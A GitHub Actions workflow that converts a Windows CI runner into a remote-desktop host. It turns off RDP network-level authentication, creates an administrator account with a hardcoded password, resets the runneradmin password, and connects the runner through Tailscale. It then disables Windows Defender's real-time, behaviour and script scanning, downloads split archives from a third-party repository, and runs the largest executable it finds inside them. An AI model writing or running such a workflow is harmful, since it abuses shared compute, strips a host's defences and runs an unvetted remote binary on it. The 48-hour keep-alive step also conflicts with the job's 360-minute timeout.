name: Windows Cloud RDP

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    timeout-minutes: 360

    steps:
      - name: 1. Enable Remote Desktop & Firewall
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0

      - name: 2. Create Admin Account
        run: |
          $Password = ConvertTo-SecureString "P@ssw0rd1qazXSW@#" -AsPlainText -Force
          New-LocalUser -Name "NvDAdmin" -Password $Password -PasswordNeverExpires -ErrorAction SilentlyContinue
          Add-LocalGroupMember -Group "Administrators" -Member "NvDAdmin" -ErrorAction SilentlyContinue
          net user runneradmin P@ssw0rd1qazXSW@#

      - name: 3. Install & Connect Tailscale VPN
        env:
          TAILSCALE_AUTHKEY: ${{ secrets.TAILSCALE_AUTHKEY }}
        run: |
          Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "C:\tailscale.msi"
          Start-Process msiexec -ArgumentList "/i C:\tailscale.msi /quiet /norestart" -Wait
          Start-Sleep -Seconds 5
          & "C:\Program Files\Tailscale\tailscale.exe" up --authkey="$Env:TAILSCALE_AUTHKEY" --hostname="github-rdp-server"
          Start-Sleep -Seconds 8
          $ts_ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
          Write-Host "==================================================" -ForegroundColor Green
          Write-Host "  Tailscale IP : $ts_ip" -ForegroundColor Yellow
          Write-Host "  Username     : NvdAdmin" -ForegroundColor Yellow
          Write-Host "  Password     : P@ssw0rd1qazXSW@#" -ForegroundColor Yellow
          Write-Host "==================================================" -ForegroundColor Green

      - name: 4. Aggressive Multi-Stage Extraction
        shell: powershell
        run: |
          # 1. Setup Workspace
          $workDir = "C:\target_app"
          if (Test-Path $workDir) { Remove-Item -Recurse -Force $workDir -ErrorAction SilentlyContinue }
          New-Item -ItemType Directory -Path $workDir -Force | Out-Null
          Set-Location -Path $workDir

          # 2. Disable Security
          Write-Host "Disabling Windows Defender..." -ForegroundColor Cyan
          Set-MpPreference -DisableRealtimeMonitoring $true
          Set-MpPreference -DisableIOAVProtection $true
          Set-MpPreference -DisableBehaviorMonitoring $true
          Set-MpPreference -DisableScriptScanning $true

          # 3. Download Initial Split Zip Files
          $filesToDownload = @(
            "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.z01",
            "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.z02",
            "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.z03",
            "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.zip"
          )

          Write-Host "Downloading initial files..." -ForegroundColor Yellow
          foreach ($url in $filesToDownload) {
              $fileName = Split-Path $url -Leaf
              Invoke-WebRequest -Uri $url -OutFile "$workDir\$fileName"
          }

          # 4. Deep Extraction Loop
          Write-Host "Starting Aggressive Extraction..." -ForegroundColor Cyan
          
          # We will loop to find and extract any ZIP file we encounter
          $maxIterations = 5
          $iteration = 0
          $foundZip = $true

          while ($foundZip -and $iteration -lt $maxIterations) {
              $iteration++
              Write-Host "Iteration $iteration: Searching for ZIP files..." -ForegroundColor Yellow
              
              # Find all ZIP files in the work directory
              $zips = Get-ChildItem -Path $workDir -Filter "*.zip" -Recurse
              
              if ($zips.Count -eq 0) {
                  Write-Host "No more ZIP files found." -ForegroundColor Green
                  $foundZip = $false
              } else {
                  foreach ($zip in $zips) {
                      Write-Host "Extracting: $($zip.FullName)" -ForegroundColor Cyan
                      
                      # Use 7-Zip to extract to the same folder as the ZIP
                      # We use -y for auto-yes and -o to specify output directory
                      $targetFolder = $zip.DirectoryName
                      & "C:\Program Files\7-Zip\7z.exe" x "$($zip.FullName)" "-o$targetFolder" -y | Out-Null
                      
                      # Small delay to allow filesystem to catch up
                      Start-Sleep -Seconds 3
                  }
                  # After one round of extraction, we check again if new ZIPs appeared
                  $foundZip = $true 
              }
          }

          # 5. Search for the Executable (The Final Target)
          Write-Host "Searching for the application (.exe)..." -ForegroundColor Cyan
          Start-Sleep -Seconds 5
          
          # We look for ANY .exe in the entire work directory
          $exeFiles = Get-ChildItem -Path $workDir -Filter "*.exe" -Recurse -ErrorAction SilentlyContinue

          if ($exeFiles.Count -gt 0) {
              # Pick the largest EXE if multiple are found, as it's likely the main app
              $exeFile = $exeFiles | Sort-Object Length -Descending | Select-Object -First 1
              $exePath = $exeFile.FullName
              $exeDir = Split-Path $exePath -Parent
              
              Write-Host "SUCCESS! Found application: $exePath" -ForegroundColor Green
              Write-Host "Launching from: $exeDir" -ForegroundColor Yellow
              
              # 6. Launch the Application
              Set-ExecutionPolicy Bypass -Scope Process -Force
              
              # Launching with high priority and specific working directory
              Start-Process -FilePath $exePath -WorkingDirectory $exeDir -WindowStyle Normal
              Write-Host "Application process triggered." -ForegroundColor Green
          } else {
              Write-Host "CRITICAL ERROR: No .exe found after $maxIterations extraction attempts." -ForegroundColor Red
              Write-Host "Current Directory Structure:" -ForegroundColor Yellow
              Get-ChildItem -Path $workDir -Recurse | Select-Object FullName | Out-File "$workDir\structure_log.txt"
              Write-Host "Full structure logged to $workDir\structure_log.txt"
          }

      - name: 5. Keep Server Alive (48 Hours)
        run: |
          for ($i = 1; $i -le 2880; $i++) {
            Start-Sleep -Seconds 60
            Write-Host "[$i/2880] Server running..."
          }
